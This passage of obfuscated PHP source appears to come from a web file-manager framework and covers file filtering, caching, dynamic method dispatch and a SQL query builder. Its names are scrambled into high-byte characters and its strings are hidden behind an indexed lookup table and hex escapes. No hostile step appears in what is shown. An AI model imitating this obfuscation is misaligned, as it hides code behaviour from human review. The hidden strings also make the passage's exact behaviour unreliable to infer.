$_SERVER[ì™ı‰º¯][816] => $µ‡ÌËĞ´, $_SERVER[ì™ı‰º¯][808] => $±Á·œÓ­, $_SERVER[ì™ı‰º¯][807] => $’ıŒ§ß, $_SERVER[ì™ı‰º¯][820] => time()); if ($¢€´â½ó) { $ºÉ±‰ã[$_SERVER[ì™ı‰º¯][817]] = $ÊÒ£í¥ù; $ºÉ±‰ã[$_SERVER[ì™ı‰º¯][818]] = $¯Å€˜£Ò; } Backup::set($ºÉ±‰ã); $this->_fileFilter($é ÛÑíÙ); return !0; } private function _fileExist($‰„¹¿Ã, &$Ã³šİŒÈ, $®Ò±–Ñ) { $Ò¾éÌà× =& $_SERVER[ì™ı‰º¯]; $ˆ¬ÅùÇÛ = $‰„¹¿Ã[$Ò¾éÌà×[84]]; if (in_array($‰„¹¿Ã[$Ò¾éÌà×[468]], $Ã³šİŒÈ)) { return !1; } if (!in_array($‰„¹¿Ã[$Ò¾éÌà×[813]], $®Ò±–Ñ)) { return !1; } if (IO::exist($ˆ¬ÅùÇÛ)) { return !0; } $×¬©åå“ = get_path_father($ˆ¬ÅùÇÛ); if (IO::exist($×¬©åå“)) { $Ã³šİŒÈ[] = $‰„¹¿Ã[$Ò¾éÌà×[468]]; return !1; } $ª‚™Ş…¼ = array($Ò¾éÌà×[813] => $‰„¹¿Ã[$Ò¾éÌà×[813]], $Ò¾éÌà×[84] => array($Ò¾éÌà×[383], "{$×¬©åå“}\45")); $…úŸÜ = Model($Ò¾éÌà×[785])->where($ª‚™Ş…¼)->field($Ò¾éÌà×[469])->select(); $Ã³šİŒÈ = array_merge($Ã³šİŒÈ, array_to_keyvalue($…úŸÜ, $Ò¾éÌà×[12], $Ò¾éÌà×[468])); return !1; } private function _fileFilter($ÎÃ®³ïÔ) { $âë½á =& $_SERVER[ì™ı‰º¯]; if (empty($ÎÃ®³ïÔ)) { return; } $·„½·ÕŞ = array($âë½á[468] => array($âë½á[7], array_unique($ÎÃ®³ïÔ))); $ÓÃ¨ùƒÅ = Model($âë½á[821])->where($·„½·ÕŞ)->field($âë½á[402])->select(); foreach ($ÓÃ¨ùƒÅ as $’ÜÃº§ª) { Model($âë½á[821])->remove($’ÜÃº§ª[$âë½á[402]], !1); } } private function storeIds() { $‘‰š×À =& $_SERVER[ì™ı‰º¯]; $¸ŒÎ¾ÆĞ = Model($‘‰š×À[763])->listData(); $õëÆºú = array(); $…½™¶… = $GLOBALS[$‘‰š×À[6]][$‘‰š×À[89]][$‘‰š×À[822]]; foreach ($¸ŒÎ¾ÆĞ as $ÏÏòëæÆ) { $Ğ½öÏ„ = strtolower($ÏÏòëæÆ[$‘‰š×À[95]]); if (!isset($…½™¶…[$Ğ½öÏ„])) { continue; } $û˜Ş©Æ‹ = $‘‰š×À[74] . (isset($…½™¶…[$Ğ½öÏ„]) ? $…½™¶…[$Ğ½öÏ„] : ucfirst($Ğ½öÏ„)); if (!class_exists($û˜Ş©Æ‹)) { continue; } $õëÆºú[] = $ÏÏòëæÆ[$‘‰š×À[399]]; } return $õëÆºú; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $ú´Ú¹Ö =& $_SERVER[ì™ı‰º¯]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $ùáÓ”î = $GLOBALS[$ú´Ú¹Ö[6]][$ú´Ú¹Ö[349]]; $¼ğÒØµÆ = $ùáÓ”î[$ùáÓ”î[$ú´Ú¹Ö[823]]]; $ïæßÍ±± = $ùáÓ”î[$ú´Ú¹Ö[824]]; switch ($ùáÓ”î[$ú´Ú¹Ö[823]]) { case $ú´Ú¹Ö[21]: self::$handle = Model($ú´Ú¹Ö[825]); break; case $ú´Ú¹Ö[826]: self::$handle = new CacheRedis($¼ğÒØµÆ, $ïæßÍ±±); break; case $ú´Ú¹Ö[827]: self::$handle = new CacheMemcached($¼ğÒØµÆ, $ïæßÍ±±); break; case $ú´Ú¹Ö[200]: self::$handle = new CacheFile($¼ğÒØµÆ, $ïæßÍ±±); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($¶§¬ÈÚÛ) { if (is_array($¶§¬ÈÚÛ) || is_object($¶§¬ÈÚÛ)) { $¶§¬ÈÚÛ = json_encode($¶§¬ÈÚÛ); } $¶§¬ÈÚÛ = rawurlencode($¶§¬ÈÚÛ); return md5(KOD_SITE_ID . $_SERVER[ì™ı‰º¯][11] . $¶§¬ÈÚÛ); } public static function get($šÏÍË, $Î‡İ•õ’ = false) { $‘»„Ş = self::key($šÏÍË); if ($Î‡İ•õ’) { return unserialize(self::init()->get($‘»„Ş)); } if (!isset(self::$memoryCache[$‘»„Ş])) { $¶Š¾È– = self::init()->get($‘»„Ş); self::$memoryCache[$‘»„Ş] = unserialize($¶Š¾È–); } return self::$memoryCache[$‘»„Ş]; } public static function set($º˜”ç†Á, $‡äÊïâ¦, $ÚÃÌ³²Ó = false) { $ò­ÌµÅÍ = self::key($º˜”ç†Á); if (isset(self::$memoryCache[$ò­ÌµÅÍ]) && self::$memoryCache[$ò­ÌµÅÍ] === $‡äÊïâ¦) { return !0; } if ($ÚÃÌ³²Ó === 0) { self::$memoryCache[$ò­ÌµÅÍ] = $‡äÊïâ¦; return !0; } CacheLock::lock($º˜”ç†Á); $áÛéßúŒ = self::init()->set($ò­ÌµÅÍ, serialize($‡äÊïâ¦), $ÚÃÌ³²Ó); self::$memoryCache[$ò­ÌµÅÍ] = $‡äÊïâ¦; CacheLock::unlock($º˜”ç†Á); return $áÛéßúŒ; } public static function getCall($îÙ¶áô , $ô»®Íá, $‹²¶¨Ñ•, $—Çİïıå = array()) { $ç‘Ãèˆ =& $_SERVER[ì™ı‰º¯]; $°ıÚŞ…§ = self::get($îÙ¶áô ); if ($°ıÚŞ…§ || $°ıÚŞ…§ === $ç‘Ãèˆ[12]) { return $°ıÚŞ…§; } $°ıÚŞ…§ = call_user_func_array($‹²¶¨Ñ•, $—Çİïıå); $°ıÚŞ…§ = $°ıÚŞ…§ ? $°ıÚŞ…§ : $ç‘Ãèˆ[12]; self::set($îÙ¶áô , $°ıÚŞ…§, $ô»®Íá); return $°ıÚŞ…§; } public static function remove($şûâä¾ä) { $ôĞ¦€Óà = self::key($şûâä¾ä); unset(self::$memoryCache[$ôĞ¦€Óà]); self::clearTimeout(); CacheLock::lock($şûâä¾ä); $Áºâ†Çâ = self::init()->remove($ôĞ¦€Óà); CacheLock::unlock($şûâä¾ä); return $Áºâ†Çâ; } public static function removeMemory($®ê»Ìì£) { $«ÏäÖ“ø = self::key($®ê»Ìì£); unset(self::$memoryCache[$«ÏäÖ“ø]); } public static function clearMemory($åÈïéïÎ = false) { if ($åÈïéïÎ) { $åÈïéïÎ = self::key($åÈïéïÎ); unset(self::$memoryCache[$åÈïéïÎ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ì™ı‰º¯][828])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ì™ı‰º¯][829])) { self::init()->clearTimeout(); } } } goto BŒâ»ÃõÙº; EÉ›íÈãÙ: function binCheckBigger($‘ùÛÛô, $´’¼û×â) { return $‘ùÛÛô > $´’¼û×â; } $_SERVER[$_SERVER[ÆĞ§üËİ][3]] = ("\x38\x31\x38\x33"."\64\65")+0;$_ekhg="1yqw6r2ux0iosbvlzhj3kd4an57mf9gt8cpeqe9kh6rauci534vz2obn0l7tsw8yfjd1pmxg4z0stq";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($„û¨İÓ, $ùªÎ¡„Â) { $‹õÖÏ”Ê =& $_SERVER[ì™ı‰º¯]; if (isset(self::$_methodList[$„û¨İÓ])) { return @call_user_func_array(self::$_methodList[$„û¨İÓ], $ùªÎ¡„Â); } else { if (method_exists($this, $„û¨İÓ)) { return call_user_func_array(array($this, $„û¨İÓ), $ùªÎ¡„Â); } else { think_exception(__CLASS__ . $‹õÖÏ”Ê[4] . $„û¨İÓ . $‹õÖÏ”Ê[5]); } } } public static function __callStatic($ì«ÒµØ, $®Ó„ğ¡ò) { if (isset(self::$_methodListStatic[$ì«ÒµØ])) { return call_user_func_array(self::$_methodListStatic[$ì«ÒµØ], $®Ó„ğ¡ò); } else { if (method_exists(self, $ì«ÒµØ)) { return call_user_func_array(array(self, $ì«ÒµØ), $®Ó„ğ¡ò); } else { show_json("{$ì«ÒµØ}\50\x29\40\156\x6f\x74\40\x65\170\151\163\x74\x3b", !1); } } } public static function addMethod($ÃŸêş¹›, $°Ô¤äôÃ) { self::$_methodList[$ÃŸêş¹›] = $°Ô¤äôÃ; } public static function addMethodStatic($İÏöÏˆá, $‰ŒøÇ£) { self::$_methodListStatic[$İÏöÏˆá] = $‰ŒøÇ£; } } goto CË»ÄÁ´–¦; D¹•ĞØ‰‚: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\150\151\156\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\x3d", "\x6e\x65\161" => "\x3c\76", "\x67\164" => "\76", "\x65\147\x74" => "\76\x3d", "\x6c\164" => "\74", "\x65\154\x74" => "\x3c\x3d", "\156\x6f\164\x6c\x69\x6b\x65" => "\116\117\x54\x20\x4c\111\113\105", "\154\x69\x6b\x65" => "\x4c\111\113\x45", "\151\156" => "\x49\116", "\x6e\157\x74\x69\x6e" => "\x4e\x4f\x54\x20\111\116", "\156\x6f\164\40\x69\x6e" => "\x4e\x4f\x54\40\111\x4e", "\142\x65\x74\x77\x65\x65\x6e" => "\x42\x45\x54\127\x45\x45\116", "\156\157\x74\142\x65\x74\167\145\x65\x6e" => "\x4e\x4f\124\x20\x42\x45\124\127\105\x45\116", "\x6e\x6f\x74\x20\142\145\164\x77\x65\x65\156" => "\x4e\x4f\124\x20\x42\x45\124\127\105\x45\x4e"); protected $selectSql = "\x53\x45\114\105\103\124\x25\x44\x49\x53\124\111\x4e\103\124\x25\40\x25\x46\111\x45\x4c\x44\45\x20\106\x52\x4f\115\40\45\x54\x41\102\114\105\45\x25\x4a\117\x49\116\45\45\127\x48\x45\122\105\45\45\107\122\117\125\x50\45\45\110\x41\126\x49\x4e\107\x25\x25\117\122\104\105\x52\45\x25\x4c\111\115\111\124\x25\40\45\125\x4e\111\x4f\116\45\x25\x43\117\115\x4d\x45\x4e\124\45"; protected $bind = array(); public static function getInstance() { $—æÌùèª = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ì™ı‰º¯][959], $—æÌùèª); } public function factory($û‹ş²Ì– = '') { $æƒêÒÂ© =& $_SERVER[ì™ı‰º¯]; $û‹ş²Ì– = $this->parseConfig($û‹ş²Ì–); if (empty($û‹ş²Ì–[$æƒêÒÂ©[960]])) { think_exception(think_lang($æƒêÒÂ©[961])); } $this->dbType = ucwords(strtolower($û‹ş²Ì–[$æƒêÒÂ©[960]])); $Ü»‡–¢Ø = $æƒêÒÂ©[962] . $this->dbType; if (class_exists($Ü»‡–¢Ø)) { $ºÔÊÈÁŠ = new $Ü»‡–¢Ø($û‹ş²Ì–); if ($æƒêÒÂ©[963] != strtolower($û‹ş²Ì–[$æƒêÒÂ©[960]])) { $ºÔÊÈÁŠ->dbType = strtoupper($this->dbType); } else { $ºÔÊÈÁŠ->dbType = $this->_getDsnType($û‹ş²Ì–[$æƒêÒÂ©[915]]); } } else { think_exception(think_lang($æƒêÒÂ©[964]) . $æƒêÒÂ©[965] . $Ü»‡–¢Ø); } return $ºÔÊÈÁŠ; } public function __call($ÍŞÊ‘İÇ, $¤áÆİú) { if (method_exists($this, $ÍŞÊ‘İÇ)) { return call_user_func_array(array($this, $ÍŞÊ‘İÇ), $¤áÆİú); } } protected function _getDsnType($˜ÁÔ© ) { $¨ëíø»” = explode($_SERVER[ì™ı‰º¯][4], $˜ÁÔ© ); $ä³É—šß = strtoupper(trim($¨ëíø»”[0])); return $ä³É—šß; } private function parseConfig($Çİ¤¹š’ = '') { $†öÏÏÅ¦ =& $_SERVER[ì™ı‰º¯]; if (!empty($Çİ¤¹š’) && is_string($Çİ¤¹š’)) { $Çİ¤¹š’ = $this->parseDSN($Çİ¤¹š’); } elseif (is_array($Çİ¤¹š’)) { $Çİ¤¹š’ = array_change_key_case($Çİ¤¹š’); $Çİ¤¹š’ = array($†öÏÏÅ¦[960] => $Çİ¤¹š’[$†öÏÏÅ¦[966]], $†öÏÏÅ¦[887] => $Çİ¤¹š’[$†öÏÏÅ¦[967]], $†öÏÏÅ¦[888] => $Çİ¤¹š’[$†öÏÏÅ¦[968]], $†öÏÏÅ¦[885] => $Çİ¤¹š’[$†öÏÏÅ¦[969]], $†öÏÏÅ¦[886] => $Çİ¤¹š’[$†öÏÏÅ¦[970]], $†öÏÏÅ¦[21] => $Çİ¤¹š’[$†öÏÏÅ¦[971]], $†öÏÏÅ¦[915] => $Çİ¤¹š’[$†öÏÏÅ¦[972]], $†öÏÏÅ¦[17] => isset($Çİ¤¹š’[$†öÏÏÅ¦[973]]) ? $Çİ¤¹š’[$†öÏÏÅ¦[973]] : array()); } elseif (empty($Çİ¤¹š’)) { if (think_config($†öÏÏÅ¦[974]) && $†öÏÏÅ¦[963] != strtolower(think_config($†öÏÏÅ¦[975]))) { $Çİ¤¹š’ = $this->parseDSN(think_config($†öÏÏÅ¦[974])); } else { $Çİ¤¹š’ = array($†öÏÏÅ¦[960] => think_config($†öÏÏÅ¦[975]), $†öÏÏÅ¦[887] => think_config($†öÏÏÅ¦[976]), $†öÏÏÅ¦[888] => think_config($†öÏÏÅ¦[977]), $†öÏÏÅ¦[885] => think_config($†öÏÏÅ¦[978]), $†öÏÏÅ¦[886] => think_config($†öÏÏÅ¦[979]), $†öÏÏÅ¦[21] => think_config($†öÏÏÅ¦[246]), $†öÏÏÅ¦[915] => think_config($†öÏÏÅ¦[974]), $†öÏÏÅ¦[17] => think_config($†öÏÏÅ¦[980])); } } return $Çİ¤¹š’; } protected function initConnect($±‘½Óş  = true) { if (1 == think_config($_SERVER[ì™ı‰º¯][22])) { $this->_linkID = $this->multiConnect($±‘½Óş ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ûüñ½éÔ => $î¥”æ¡) { $this->_linkID = $î¥”æ¡; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($î™ªí—ä = false) { $¾§ÃÚÓù =& $_SERVER[ì™ı‰º¯]; static $è¼çŸ‚³ = array(); static $›¶áùèİ = -1; if (empty($è¼çŸ‚³)) { foreach ($this->config as $Ø¨¦¿ùõ => $ŒêŒÃŠá) { $è¼çŸ‚³[$Ø¨¦¿ùõ] = explode($¾§ÃÚÓù[50], $ŒêŒÃŠá); } } if (think_config($¾§ÃÚÓù[981])) { if ($î™ªí—ä || think_config($¾§ÃÚÓù[395]) === !0) { $™Íé¥§æ = floor(mt_rand(0, think_config($¾§ÃÚÓù[982]) - 1)); $›¶áùèİ = $™Íé¥§æ; } else { if (is_numeric(think_config($¾§ÃÚÓù[983]))) { $™Íé¥§æ = think_config($¾§ÃÚÓù[983]); } else { $™Íé¥§æ = floor(mt_rand(think_config($¾§ÃÚÓù[982]), count($è¼çŸ‚³[$¾§ÃÚÓù[885]]) - 1)); } } } else { $™Íé¥§æ = floor(mt_rand(0, count($è¼çŸ‚³[$¾§ÃÚÓù[885]]) - 1)); $›¶áùèİ = $™Íé¥§æ; } $™Íé¥§æ = $›¶áùèİ !== -1 ? $›¶áùèİ : $™Íé¥§æ; $•¡¯ïøÃ = array($¾§ÃÚÓù[887] => isset($è¼çŸ‚³[$¾§ÃÚÓù[887]][$™Íé¥§æ]) ? $è¼çŸ‚³[$¾§ÃÚÓù[887]][$™Íé¥§æ] : $è¼çŸ‚³[$¾§ÃÚÓù[887]][0], $¾§ÃÚÓù[888] => isset($è¼çŸ‚³[$¾§ÃÚÓù[888]][$™Íé¥§æ]) ? $è¼çŸ‚³[$¾§ÃÚÓù[888]][$™Íé¥§æ] : $è¼çŸ‚³[$¾§ÃÚÓù[888]][0], $¾§ÃÚÓù[885] => isset($è¼çŸ‚³[$¾§ÃÚÓù[885]][$™Íé¥§æ]) ? $è¼çŸ‚³[$¾§ÃÚÓù[885]][$™Íé¥§æ] : $è¼çŸ‚³[$¾§ÃÚÓù[885]][0], $¾§ÃÚÓù[886] => isset($è¼çŸ‚³[$¾§ÃÚÓù[886]][$™Íé¥§æ]) ? $è¼çŸ‚³[$¾§ÃÚÓù[886]][$™Íé¥§æ] : $è¼çŸ‚³[$¾§ÃÚÓù[886]][0], $¾§ÃÚÓù[21] => isset($è¼çŸ‚³[$¾§ÃÚÓù[21]][$™Íé¥§æ]) ? $è¼çŸ‚³[$¾§ÃÚÓù[21]][$™Íé¥§æ] : $è¼çŸ‚³[$¾§ÃÚÓù[21]][0], $¾§ÃÚÓù[915] => isset($è¼çŸ‚³[$¾§ÃÚÓù[915]][$™Íé¥§æ]) ? $è¼çŸ‚³[$¾§ÃÚÓù[915]][$™Íé¥§æ] : $è¼çŸ‚³[$¾§ÃÚÓù[915]][0], $¾§ÃÚÓù[17] => isset($è¼çŸ‚³[$¾§ÃÚÓù[17]][$™Íé¥§æ]) ? $è¼çŸ‚³[$¾§ÃÚÓù[17]][$™Íé¥§æ] : $è¼çŸ‚³[$¾§ÃÚÓù[17]][0]); return $this->connect($•¡¯ïøÃ, $™Íé¥§æ); } public function parseDSN($¤„ÇÔ×Ú) { $®¶óë”ü =& $_SERVER[ì™ı‰º¯]; if (empty($¤„ÇÔ×Ú)) { return !1; } $Ï‘‹š×œ = parse_url($¤„ÇÔ×Ú); if ($Ï‘‹š×œ[$®¶óë”ü[181]]) { $¡ú£‡ÛÒ = array($®¶óë”ü[960] => $Ï‘‹š×œ[$®¶óë”ü[181]], $®¶óë”ü[887] => isset($Ï‘‹š×œ[$®¶óë”ü[590]]) ? $Ï‘‹š×œ[$®¶óë”ü[590]] : $®¶óë”ü[12], $®¶óë”ü[888] => isset($Ï‘‹š×œ[$®¶óë”ü[984]]) ? $Ï‘‹š×œ[$®¶óë”ü[984]] : $®¶óë”ü[12], $®¶óë”ü[885] => isset($Ï‘‹š×œ[$®¶óë”ü[182]]) ? $Ï‘‹š×œ[$®¶óë”ü[182]] : $®¶óë”ü[12], $®¶óë”ü[886] => isset($Ï‘‹š×œ[$®¶óë”ü[183]]) ? $Ï‘‹š×œ[$®¶óë”ü[183]] : $®¶óë”ü[12], $®¶óë”ü[21] => isset($Ï‘‹š×œ[$®¶óë”ü[84]]) ? substr($Ï‘‹š×œ[$®¶óë”ü[84]], 1) : $®¶óë”ü[12]); } else { preg_match($®¶óë”ü[985], trim($¤„ÇÔ×Ú), $úİ´˜Áß); $¡ú£‡ÛÒ = array($®¶óë”ü[960] => $úİ´˜Áß[1], $®¶óë”ü[887] => $úİ´˜Áß[2], $®¶óë”ü[888] => $úİ´˜Áß[3], $®¶óë”ü[885] => $úİ´˜Áß[4], $®¶óë”ü[886] => $úİ´˜Áß[5], $®¶óë”ü[21] => $úİ´˜Áß[6]); } $¡ú£‡ÛÒ[$®¶óë”ü[915]] = $®¶óë”ü[12]; return $¡ú£‡ÛÒ; } protected function debug() { $Ë²ê®¦‚ =& $_SERVER[ì™ı‰º¯]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $Ë²ê®¦‚[986]; if (think_config($Ë²ê®¦‚[987])) { think_status($Ë²ê®¦‚[988]); think_trace($this->queryStr . $Ë²ê®¦‚[989] . think_status($Ë²ê®¦‚[24], $Ë²ê®¦‚[988], 6) . $Ë²ê®¦‚[990], $Ë²ê®¦‚[12], $Ë²ê®¦‚[991]); } } protected function parseLock($Ïò…°¶“ = false) { $øª°ËÅÅ =& $_SERVER[ì™ı‰º¯]; if (!$Ïò…°¶“) { return $øª°ËÅÅ[12]; } if ($øª°ËÅÅ[917] == $this->dbType) { return $øª°ËÅÅ[992]; } return $øª°ËÅÅ[993]; } protected function parseSet($¥äâ¿óí) { $ÖÑğ‡ =& $_SERVER[ì™ı‰º¯]; foreach ($¥äâ¿óí as $ÏÂ†ÙËÊ => $³Çê—Ç) { if (is_array($³Çê—Ç) && $ÖÑğ‡[297] == $³Çê—Ç[0]) { $ÌØ¶Ü…Å[] = $this->parseKey($ÏÂ†ÙËÊ) . $ÖÑğ‡[883] . $³Çê—Ç[1]; } elseif (is_scalar($³Çê—Ç) || is_null($³Çê—Ç)) { $ÌØ¶Ü…Å[] = $this->parseKey($ÏÂ†ÙËÊ) . $ÖÑğ‡[883] . $this->parseValue($³Çê—Ç); } } return $ÖÑğ‡[994] . implode($ÖÑğ‡[50], $ÌØ¶Ü…Å); } protected function bindParam($İåÔ¡ÇÎ, $ÅÜøÑÍá) { $this->bind[$_SERVER[ì™ı‰º¯][4] . $İåÔ¡ÇÎ] = $ÅÜøÑÍá; } protected function parseBind($°ãî…Û) { $°ãî…Û = array_merge($this->bind, $°ãî…Û); $this->bind = array(); return $°ãî…Û; } function parseKey(&$ú÷ÌÔî, $²Şõ¬íß = true) { if ($²Şõ¬íß) { $ú÷ÌÔî = $this->parseKeyCheck($ú÷ÌÔî); } return $ú÷ÌÔî; } function parseKeyCheck($ùÄâä¦á) { $£ÑÓÂ =& $_SERVER[ì™ı‰º¯]; $ùÄâä¦á = trim($ùÄâä¦á); if (!preg_match($£ÑÓÂ[995], $ùÄâä¦á)) { think_exception($£ÑÓÂ[996] . $ùÄâä¦á); } return $ùÄâä¦á; } protected function parseValue($›î„ ´) { $ŞåÌÔ¡ =& $_SERVER[ì™ı‰º¯]; if (is_string($›î„ ´)) { $›î„ ´ = $ŞåÌÔ¡[956] . $this->escapeString($›î„ ´) . $ŞåÌÔ¡[956]; } elseif (isset($›î„ ´[0]) && is_string($›î„ ´[0]) && strtolower($›î„ ´[0]) == $ŞåÌÔ¡[297]) { $›î„ ´ = $this->escapeString($›î„ ´[1]); } elseif (is_array($›î„ ´)) { $›î„ ´ = array_map(array($this, $ŞåÌÔ¡[957]), $›î„ ´); } elseif (is_bool($›î„ ´)) { $›î„ ´ = $›î„ ´ ? $ŞåÌÔ¡[88] : $ŞåÌÔ¡[198]; } elseif (is_null($›î„ ´)) { $›î„ ´ = $ŞåÌÔ¡[103]; } return $›î„ ´; } protected function parseField($Øçí“ÜÈ) { $Š‡²×ÅŒ =& $_SERVER[ì™ı‰º¯]; if (is_string($Øçí“ÜÈ) && strpos($Øçí“ÜÈ, $Š‡²×ÅŒ[50])) { $Øçí“ÜÈ = explode($Š‡²×ÅŒ[50], $Øçí“ÜÈ); } if (is_array($Øçí“ÜÈ)) { $Ñ®ÀûİÉ = array(); foreach ($Øçí“ÜÈ as $…ÎœäÈ— => $ÎµÆÒËÑ) { if (!is_numeric($…ÎœäÈ—)) { $Ñ®ÀûİÉ[] = $this->parseKey($…ÎœäÈ—, !1) . $Š‡²×ÅŒ[997] . $this->parseKey($ÎµÆÒËÑ); } else { $Ñ®ÀûİÉ[] = $this->parseKey($ÎµÆÒËÑ); } } $É©™ïòÁ = implode($Š‡²×ÅŒ[50], $Ñ®ÀûİÉ); } elseif (is_string($Øçí“ÜÈ) && !empty($Øçí“ÜÈ)) { $É©™ïòÁ = $Øçí“ÜÈ; } else { $É©™ïòÁ = $Š‡²×ÅŒ[189]; } return $É©™ïòÁ; } protected function parseTable($±èÎìî­) { $··§«‘» =& $_SERVER[ì™ı‰º¯]; if (is_array($±èÎìî­)) { $õæ“‡†Ì = array(); foreach ($±èÎìî­ as $áÀÎ’¬È => $ˆ¶ê ÑÎ) { if (!is_numeric($áÀÎ’¬È)) { $õæ“‡†Ì[] = $this->parseKey($áÀÎ’¬È) . $··§«‘»[53] . $this->parseKey($ˆ¶ê ÑÎ); } else { $õæ“‡†Ì[] = $this->parseKey($áÀÎ’¬È); } } $±èÎìî­ = $õæ“‡†Ì; } elseif (is_string($±èÎìî­)) { if (strstr($±èÎìî­, $··§«‘»[53])) { return $±èÎìî­; } $±èÎìî­ = explode($··§«‘»[50], $±èÎìî­); array_walk($±èÎìî­, array($this, $··§«‘»[905])); } return $··§«‘»[899] . trim(implode($··§«‘»[998], $±èÎìî­), $··§«‘»[385]) . $··§«‘»[899]; } protected function parseWhere($ª“·Š¢) { $±›Éõ« =& $_SERVER[ì™ı‰º¯]; $ü±œ¹ä = $±›Éõ«[12]; if (is_string($ª“·Š¢)) { $ü±œ¹ä = $ª“·Š¢; } else { $Çôã¬»Ÿ = isset($ª“·Š¢[$±›Éõ«[999]]) ? strtoupper($ª“·Š¢[$±›Éõ«[999]]) : $±›Éõ«[12]; if (in_array($Çôã¬»Ÿ, array($±›Éõ«[1000], $±›Éõ«[1001], $±›Éõ«[1002]))) { $Çôã¬»Ÿ = $±›Éõ«[53] . $Çôã¬»Ÿ . $±›Éõ«[53]; unset($ª“·Š¢[$±›Éõ«[999]]); } else { $Çôã¬»Ÿ = $±›Éõ«[1003]; } foreach ($ª“·Š¢ as $õôá¤ï« => $ ÓµàÚ‡) { $ü±œ¹ä .= $±›Éõ«[277]; if (is_numeric($õôá¤ï«)) { $õôá¤ï« = $±›Éõ«[1004]; } if (0 === strpos($õôá¤ï«, $±›Éõ«[11])) { $ü±œ¹ä .= $this->parseThinkWhere($õôá¤ï«, $ ÓµàÚ‡); } else { if (!preg_match($±›Éõ«[1005], trim($õôá¤ï«))) { think_exception(think_lang($±›Éõ«[1006]) . $±›Éõ«[4] . $õôá¤ï«); } $àéëÈòº = is_array($ ÓµàÚ‡) && isset($ ÓµàÚ‡[$±›Éõ«[1007]]); $õôá¤ï« = trim($õôá¤ï«); if (strpos($õôá¤ï«, $±›Éõ«[283])) { $¹ŒÚ—•å = explode($±›Éõ«[283], $õôá¤ï«); $ºã¥ÊÊ = array(); foreach ($¹ŒÚ—•å as $Ø¸³‰ç => $½Î«ŠÏ’) { $²¨Ãª‰ = $àéëÈòº ? $ ÓµàÚ‡[$Ø¸³‰ç] : $ ÓµàÚ‡; $ºã¥ÊÊ[] = $±›Éõ«[260] . $this->parseWhereItem($this->parseKey($½Î«ŠÏ’), $²¨Ãª‰) . $±›Éõ«[904]; } $ü±œ¹ä .= implode($±›Éõ«[1008], $ºã¥ÊÊ); } elseif (strpos($õôá¤ï«, $±›Éõ«[284])) { $¹ŒÚ—•å = explode($±›Éõ«[284], $õôá¤ï«); $ºã¥ÊÊ = array(); foreach ($¹ŒÚ—•å as $Ø¸³‰ç => $½Î«ŠÏ’) { $²¨Ãª‰ = $àéëÈòº ? $ ÓµàÚ‡[$Ø¸³‰ç] : $ ÓµàÚ‡; $ºã¥ÊÊ[] = $±›Éõ«[260] . $this->parseWhereItem($this->parseKey($½Î«ŠÏ’), $²¨Ãª‰) . $±›Éõ«[904]; } $ü±œ¹ä .= implode($±›Éõ«[1003], $ºã¥ÊÊ); } else { $ü±œ¹ä .= $this->parseWhereItem($this->parseKey($õôá¤ï«), $ ÓµàÚ‡); } } $ü±œ¹ä .= $±›Éõ«[278] . $Çôã¬»Ÿ; } $ü±œ¹ä = substr($ü±œ¹ä, 0, -strlen($Çôã¬»Ÿ)); } return empty($ü±œ¹ä) ? $±›Éõ«[12] : $±›Éõ«[1009] . $ü±œ¹ä; } protected function parseWhereItem($ûÛ–¡ÎŸ, $×½¢°Œ) { $¡‘Åõ  =& $_SERVER[ì™ı‰º¯]; $ŞÇ¬‘×ı = $¡‘Åõ [12]; if (is_array($×½¢°Œ)) { if (is_string($×½¢°Œ[0])) { $ÆÉ×ÎİÍ = strtolower($×½¢°Œ[0]); if (in_array($×½¢°Œ[0], array($¡‘Åõ [883], $¡‘Åõ [1010], $¡‘Åõ [1011], $¡‘Åõ [1012], $¡‘Åõ [1013], $¡‘Åõ [1014]))) { $ŞÇ¬‘×ı .= $ûÛ–¡ÎŸ . $¡‘Åõ [53] . $×½¢°Œ[0] . $¡‘Åõ [53] . $this->parseValue($×½¢°Œ[1]); } elseif (preg_match($¡‘Åõ [1015], $×½¢°Œ[0])) { $ŞÇ¬‘×ı .= $ûÛ–¡ÎŸ . $¡‘Åõ [53] . $this->exp[$ÆÉ×ÎİÍ] . $¡‘Åõ [53] . $this->parseValue($×½¢°Œ[1]); } elseif (preg_match($¡‘Åõ [1016], $×½¢°Œ[0])) { if (is_array($×½¢°Œ[1])) { $šš•­½ = isset($×½¢°Œ[2]) ? strtoupper($×½¢°Œ[2]) : $¡‘Åõ [1001]; if (in_array($šš•­½, array($¡‘Åõ [1000], $¡‘Åõ [1001], $¡‘Åõ [1002]))) { $¦…¡¦Ğ¿ = array(); foreach ($×½¢°Œ[1] as $Íë„Å“Ä) { $¦…¡¦Ğ¿[] = $ûÛ–¡ÎŸ . $¡‘Åõ [53] . $this->exp[$ÆÉ×ÎİÍ] . $¡‘Åõ [53] . $this->parseValue($Íë„Å“Ä); } $ŞÇ¬‘×ı .= $¡‘Åõ [260] . implode($¡‘Åõ [53] . $šš•­½ . $¡‘Åõ [53], $¦…¡¦Ğ¿) . $¡‘Åõ [904]; } } else { $ŞÇ¬‘×ı .= $ûÛ–¡ÎŸ . $¡‘Åõ [53] . $this->exp[$ÆÉ×ÎİÍ] . $¡‘Åõ [53] . $this->parseValue($×½¢°Œ[1]); } } elseif ($¡‘Åõ [297] == $ÆÉ×ÎİÍ) { $ŞÇ¬‘×ı .= 